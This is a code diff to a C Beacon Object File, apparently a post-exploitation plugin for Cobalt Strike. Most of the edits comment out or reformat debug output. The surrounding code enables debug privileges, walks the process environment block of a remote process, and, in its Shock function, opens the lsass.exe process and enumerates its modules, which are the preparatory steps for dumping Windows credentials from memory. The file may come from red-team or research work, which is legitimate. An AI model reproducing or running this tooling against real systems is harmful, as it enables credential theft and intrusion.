@@ -118,7 +118,7 @@ char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
 
 void EnableDebugPrivileges() {
     HANDLE currentProcess = KERNEL32$GetCurrentProcess();
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Current process handle:\t%d\n", currentProcess);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Current process handle:\t%d\n", currentProcess);
 
     HANDLE tokenHandle = NULL;
 
@@ -128,7 +128,7 @@ void EnableDebugPrivileges() {
         BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtOpenProcessToken. NTSTATUS: 0x%08X\n", ntstatus);
         return;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] NTSTATUS: %d\n", ntstatus);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] NTSTATUS: %d\n", ntstatus);
 
     // Set the privilege
     TOKEN_PRIVILEGES_STRUCT tokenPrivileges;
@@ -143,7 +143,7 @@ void EnableDebugPrivileges() {
         NTDLL$NtClose(tokenHandle);
         return;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] NTSTATUS: %d\n", ntstatus);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] NTSTATUS: %d\n", ntstatus);
 
     // Close the handle
     if (tokenHandle != NULL) {
@@ -168,7 +168,7 @@ char* GetProcNameFromHandle(HANDLE process_handle) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
         return "";
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] PBI Addr: 0x%p.\n", pbi_addr);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] PBI Addr: 0x%p.\n", pbi_addr);
     
     ULONG returnLength = 0;
 
@@ -177,26 +177,26 @@ char* GetProcNameFromHandle(HANDLE process_handle) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
         return;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] NTSTATUS: %d\n", ntstatus);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] NTSTATUS: %d\n", ntstatus);
 
     PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
     // TO ADD: KERNEL32$HeapFree(hHeap, 0, pbi_addr);
     PVOID pebaddress = *(PVOID*)peb_pointer;
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: 0x%p\n", pebaddress);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: 0x%p\n", pebaddress);
 
     // Get PEB->ProcessParameters
     PVOID processparameters_pointer = (PVOID)((BYTE*)pebaddress + processparameters_offset);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] processparameters_pointer: 0x%p\n", processparameters_pointer);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] processparameters_pointer: 0x%p\n", processparameters_pointer);
 
     PVOID processparameters_address = ReadRemoteIntPtr(process_handle, processparameters_pointer);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] processparameters_address: 0x%p\n", processparameters_address);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] processparameters_address: 0x%p\n", processparameters_address);
     
     PVOID commandline_pointer = (PVOID)((BYTE*)processparameters_address + commandline_offset);
     PVOID commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] commandline_address: 0x%p\n", commandline_address);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] commandline_address: 0x%p\n", commandline_address);
 
     char* commandline_value = ReadRemoteWStr(process_handle, commandline_address);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] commandline_value: %s\n", commandline_value);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] commandline_value: %s\n", commandline_value);
 
     //BeaconPrintf(CALLBACK_OUTPUT, "[+] Function end.\n");
     return commandline_value;
@@ -237,7 +237,7 @@ ModuleInformation* CustomGetModuleHandle(HANDLE process_handle, int* out_module_
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
         return "";
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] PBI Addr: 0x%p.\n", pbi_addr);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] PBI Addr: \t0x%p.\n", pbi_addr);
     
     ULONG returnLength = 0;
 
@@ -246,23 +246,23 @@ ModuleInformation* CustomGetModuleHandle(HANDLE process_handle, int* out_module_
         BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
         return;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] NTSTATUS: %d\n", ntstatus);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] NTSTATUS: %d\n", ntstatus);
 
     PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
     // TO ADD: KERNEL32$HeapFree(hHeap, 0, pbi_addr);
     PVOID pebaddress = *(PVOID*)peb_pointer;
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: 0x%p\n", pebaddress);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: \t\t0x%p\n", pebaddress);
 
     // Get PEB->Ldr
     void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Ldr Pointer: \t0x%p\n", ldr_pointer);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Ldr Pointer: \t0x%p\n", ldr_pointer);
     void* ldr_address = ReadRemoteIntPtr(process_handle, ldr_pointer);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Ldr Address: \t0x%p\n", ldr_address);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Ldr Address: \t0x%p\n", ldr_address);
 
     // Traverse the InitializationOrderModuleList
     void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_address + inInitializationOrderModuleList_offset);
     void* next_flink = ReadRemoteIntPtr(process_handle, InInitializationOrderModuleList);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Initial Next Flink: \t0x%p\n", next_flink);
+    //BeaconPrintf(CALLBACK_OUTPUT, "[+] Initial Next Flink: \t0x%p\n", next_flink);
 
     // Free memory
     KERNEL32$HeapFree(hHeap, 0, pbi_addr);
@@ -611,7 +611,7 @@ void write_string_to_file(char* file_path, char* data) {
     if (!result) {
         BeaconPrintf(CALLBACK_ERROR, "Failed to write to file: %s\n", file_path);
     } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "Successfully wrote %d bytes to file: %s\n", bytesWritten, file_path);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] File %s generated (%d bytes).\n", file_path, bytesWritten);
     }
 
     // Close handle
@@ -623,10 +623,10 @@ void Shock(){
     char* filename = "shock.json";
     EnableDebugPrivileges();
     HANDLE currentProcess = KERNEL32$GetCurrentProcess();
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Current process handle:\t%d\n", currentProcess);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Current process handle:\t%d\n", currentProcess);
     GetProcNameFromHandle(currentProcess);
     HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process handle: %d.\n", hProcess);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process handle: \t\t%d\n", hProcess);
     int module_counter = 0;
     ModuleInformation* module_list = CustomGetModuleHandle(hProcess, &module_counter);
     // print(module_list, module_counter);    
